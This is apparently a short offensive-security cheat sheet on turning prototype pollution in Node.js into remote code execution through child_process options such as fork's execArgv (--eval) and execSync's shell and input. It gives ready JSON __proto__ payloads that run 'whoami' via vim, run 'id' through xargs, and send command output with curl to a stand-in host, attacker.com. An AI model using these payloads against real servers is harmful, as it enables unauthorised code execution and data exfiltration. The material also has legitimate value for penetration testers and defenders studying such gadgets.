# RCE via Methods

Methods such as `child_process.spawn()` and `child_process.fork()` enable developers to create new Node subprocesses. The `fork()` method accepts an options object in which one of the potential options is the `execArgv` property.

As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using `NODE_OPTIONS`. Of particular interest is the `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the `child_process`.

```json
"execArgv": [ 
	="--eval=require('<module>')"= 
]
```

In addition to `fork()`, the `child_process` module contains the `execSync()` method, which executes an arbitrary string as a system command. By chaining these JavaScript and command injection sinks, we can probably gain full RCE capability on the server.

***

`execSync()` can take an options object, which includes properties like:

* `shell` , can be used to call `/bin/sh`
* `input` , sends data to the `stdin` of the child process

If both of these are left **undefined**. It can be vulnerable to Prototype Pollution. Besides that, here is an example of using `vim` as a shell

```json
{
  "__proto__": {
    "shell": "vim",
    "input": ":! whoami\n"
  }
}
```

***

Some workarounds if `stdin` is not read properly.

1. **`xargs` (converts `stdin` to arguments)**

```json
{
  "__proto__": {
    "shell": "/bin/sh",
    "input": "id | xargs\n"
  }
}
```

2. **Using `curl` with stdin (`-d @-`**

```json
{
  "__proto__": {
    "shell": "/bin/sh",
    "input": "curl -d @- http://attacker.com\n"
  }
}
```
